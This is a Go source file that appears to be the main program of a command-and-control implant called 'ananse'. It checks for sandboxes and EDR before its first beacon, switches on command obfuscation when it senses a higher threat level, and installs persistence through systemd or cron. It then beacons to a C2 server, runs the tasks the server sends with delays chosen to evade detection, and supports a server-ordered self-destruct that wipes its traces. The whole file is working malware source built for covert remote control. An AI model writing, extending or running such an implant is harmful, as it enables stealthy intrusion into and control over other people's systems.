package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"github.com/natx6/ananse/src/c2/implant/executor"
	"github.com/natx6/ananse/src/c2/implant/shell"
	"github.com/natx6/ananse/src/c2/implant/stealth"
	"github.com/natx6/ananse/src/c2/implant/watchdog"
)

// Build-time overrides (set via -ldflags).
var (
	Version   = "1.0.0"
	BuildTime = "unknown"
)

func main() {
	serverURL := flag.String("server", "http://localhost:8443", "C2 server URL")
	token := flag.String("token", "", "Implant authentication token")
	implantID := flag.String("id", "", "Implant ID (auto-generated if empty)")
	interval := flag.Int64("interval", 60000, "Base beacon interval in ms")
	noPersistence := flag.Bool("no-persist", false, "Skip watchdog persistence install")
	noObfuscate := flag.Bool("no-obfuscate", false, "Disable command obfuscation")
	flag.Parse()

	if *token == "" {
		fmt.Fprintln(os.Stderr, "error: --token is required")
		os.Exit(1)
	}

	// Resolve implant ID
	id := resolveID(*implantID)
	shortID := id
	if len(id) > 8 {
		shortID = id[:8]
	}
	fmt.Printf("[ananse] implant %s starting (v%s)\n", shortID, Version)
	fmt.Printf("[ananse] server: %s\n", *serverURL)

	// -----------------------------------------------------------------------
	// Pre-flight quick check — sandbox/EDR detection before first beacon
	// -----------------------------------------------------------------------
	threatLevel, initialDelay := stealth.QuickCheck()
	if threatLevel != "low" {
		fmt.Printf("[ananse] pre-flight threat level: %s — delaying first beacon %v\n", threatLevel, initialDelay)
	}
	if initialDelay > 0 {
		stealth.Sleep(initialDelay)
	}

	// Enable command obfuscation for medium+ threat
	if !*noObfuscate && (threatLevel == "medium" || threatLevel == "high" || threatLevel == "critical") {
		shell.CommandObfuscate = true
		fmt.Printf("[ananse] command obfuscation enabled (threat: %s)\n", threatLevel)
	}

	// -----------------------------------------------------------------------
	// Watchdog — auto-persistence (unless --no-persist)
	// -----------------------------------------------------------------------
	if !*noPersistence {
		exePath, err := os.Executable()
		if err == nil {
			if !watchdog.IsPersistent() {
				if err := watchdog.Install(exePath); err == nil {
					fmt.Println("[ananse] persistence installed (systemd/cron)")
				} else {
					fmt.Fprintf(os.Stderr, "[ananse] persistence install skipped: %v\n", err)
				}
			} else {
				fmt.Println("[ananse] persistence already active")
			}
		}
	}

	// -----------------------------------------------------------------------
	// Profiler — create and run initial profile
	// -----------------------------------------------------------------------
	profiler := stealth.NewProfiler()
	var lastProfile time.Time
	profileInterval := 10 // re-profile every N beacons

	// Create client and task runner
	client := beacon.NewClient(*serverURL, *token, id)
	runner := executor.NewTaskRunner()

	// Track start time for uptime
	startTime := time.Now()

	// Signal handling for graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	var selfDestruct atomic.Bool

	// -----------------------------------------------------------------------
	// Main beacon loop
	// -----------------------------------------------------------------------
	failCount := 0
	beaconNum := 0
	for {
		select {
		case <-sigCh:
			fmt.Println("\n[ananse] shutting down")
			return
		default:
		}

		if selfDestruct.Load() {
			fmt.Println("[ananse] self-destruct sequence")
			doSelfDestruct(runner)
			return
		}

		beaconNum++

		// Periodic profile refresh
		if beaconNum%profileInterval == 0 || time.Since(lastProfile) > 5*time.Minute {
			prof := profiler.Profile(0) // bypass cooldown for first
			_ = prof
			lastProfile = time.Now()

			// Update command obfuscation based on latest threat
			if !*noObfuscate && prof != nil && (prof.ThreatLevel == "medium" || prof.ThreatLevel == "high" || prof.ThreatLevel == "critical") {
				shell.CommandObfuscate = true
			}
		}

		// Build heartbeat with latest profile
		uptime := int64(time.Since(startTime).Seconds())
		loadavg := loadAvg()
		results := runner.PendingResults()
		prof := profiler.Profile(3 * time.Minute) // cached, refresh every 3 min

		hb := &beacon.ImplantHeartbeat{
			ImplantID:      id,
			Status:         statusFromLoad(runner.RunningCount()),
			Uptime:         uptime,
			Loadavg:        loadavg,
			Profile:        prof,
			PendingResults: results,
		}

		resp, err := client.Beacon(hb)
		if err != nil {
			failCount++
			delay := stealth.FailDelay(failCount, 5*time.Second, 120*time.Second)
			fmt.Fprintf(os.Stderr, "[ananse] beacon failed (attempt %d): %v — retry in %v\n", failCount, err, delay)
			stealth.Sleep(delay)
			continue
		}
		failCount = 0

		// Handle server command
		switch resp.Command {
		case "selfdestruct":
			fmt.Println("[ananse] server-commanded self-destruct")
			selfDestruct.Store(true)
			doSelfDestruct(runner)
			return

		case "sleep":
			dur := parseDuration(resp.CommandParam, 30*time.Minute)
			fmt.Printf("[ananse] sleep %v\n", dur)
			stealth.Sleep(dur)
			continue
		}

		// Remove acked results
		if len(resp.AckedResults) > 0 {
			runner.AckResults(resp.AckedResults)
		}

		// Execute new tasks with stealth delays between them
		for i, task := range resp.Tasks {
			if i > 0 {
				// Insert delay between task launches based on threat
				delay := stealth.WaitBetweenOps(string(threatLevel))
				stealth.Sleep(delay)
			}
			fmt.Printf("[ananse] executing task %s (%s)\n", task.TaskID[:8], task.Type)
			runner.ExecuteTaskAsync(task)
		}

		// Determine beacon interval from config, adjusted for threat
		base := *interval
		if resp.Config.BeaconInterval > 0 {
			base = resp.Config.BeaconInterval
		}
		// Adjust interval based on threat level
		threatForInterval := threatLevel
		if prof != nil && prof.ThreatLevel != "" {
			threatForInterval = prof.ThreatLevel
		}
		adjusted := stealth.BeaconIntervalForThreat(threatForInterval, base)
		next := beacon.NextInterval(adjusted)
		stealth.Sleep(next)
	}
}

// doSelfDestruct handles the full self-destruct sequence.
func doSelfDestruct(runner *executor.TaskRunner) {
	fmt.Println("[ananse] self-destruct sequence initiated")

	// 1. Wait briefly for running tasks to finish
	if running := runner.RunningCount(); running > 0 {
		fmt.Printf("[ananse] waiting for %d running task(s)...\n", running)
		// Give tasks up to 10 seconds to complete
		for i := 0; i < 10; i++ {
			if runner.RunningCount() == 0 {
				break
			}
			stealth.Sleep(1 * time.Second)
		}
		// Cancel any remaining
		fmt.Printf("[ananse] %d task(s) still running — cancelling\n", runner.RunningCount())
	}

	// 2. Remove persistence + wipe binary + clean ID files
	if err := watchdog.SelfDestruct(); err != nil {
		fmt.Fprintf(os.Stderr, "[ananse] self-destruct error: %v\n", err)
	}

	fmt.Println("[ananse] goodbye")
	os.Exit(0)
}

// ---------------------------------------------------------------------------
// Implant ID persistence
// ---------------------------------------------------------------------------

func resolveID(flagID string) string {
	candidates := []string{
		os.ExpandEnv("${HOME}/.ananse/id"),
		"/var/lib/ananse/id",
		os.ExpandEnv("${HOME}/.config/ananse/id"),
	}
	if flagID != "" {
		candidates = append([]string{flagID}, candidates...)
	}

	for _, p := range candidates {
		if p == flagID && flagID != "" {
			return flagID
		}
		data, err := os.ReadFile(p)
		if err == nil {
			id := strings.TrimSpace(string(data))
			if id != "" {
				return id
			}
		}
	}

	id := generateID()
	saveID(id)
	return id
}

func generateID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("ananse-%d-%d", os.Getpid(), time.Now().UnixNano())
	}
	return hex.EncodeToString(b[:4]) + "-" +
		hex.EncodeToString(b[4:6]) + "-" +
		hex.EncodeToString(b[6:8]) + "-" +
		hex.EncodeToString(b[8:10]) + "-" +
		hex.EncodeToString(b[10:])
}

func saveID(id string) {
	dirs := []string{
		os.ExpandEnv("${HOME}/.ananse"),
		"/var/lib/ananse",
	}
	for _, d := range dirs {
		if err := os.MkdirAll(d, 0700); err == nil {
			_ = os.WriteFile(filepath.Join(d, "id"), []byte(id), 0600)
			return
		}
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func loadAvg() [3]float64 {
	var la [3]float64
	data, err := os.ReadFile("/proc/loadavg")
	if err != nil {
		return la
	}
	fmt.Sscanf(string(data), "%f %f %f", &la[0], &la[1], &la[2])
	return la
}

func statusFromLoad(running int) string {
	if running > 0 {
		return "running_task"
	}
	return "active"
}

func parseDuration(s string, fallback time.Duration) time.Duration {
	if s == "" {
		return fallback
	}
	d, err := time.ParseDuration(s)
	if err != nil {
		return fallback
	}
	return d
}
